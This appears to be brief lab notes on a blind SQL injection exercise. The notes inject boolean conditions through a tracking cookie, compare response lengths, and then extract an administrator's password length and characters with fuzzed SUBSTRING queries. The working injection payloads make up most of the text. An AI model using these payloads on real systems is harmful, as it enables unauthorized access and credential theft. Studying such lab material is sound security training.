1) take a request and change the cookie TrackerId to 
...' and '1' = '1' --

we can see here that it works and the response has length 5305 and contains the string "welcome back"

...' and '1' = '0' --
this will return false and in fact the length of the response is here 2544 and doesn't contain the string "welcome back"


2) we know that there is a table users and a username administrator, so we can use boolean selects to retrieve the password

LENGTH of password:

...' and (select length(password) from users where username = "administrator" ) = 1 --

then we fuzz the 1 from 1 to 25 and we get that the password has length 20


3) now  we can use substring to retrieve the password

...' and (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

and we fuzz the first 1 from 1 to 20 and the char 'a' from a to z and 0-9
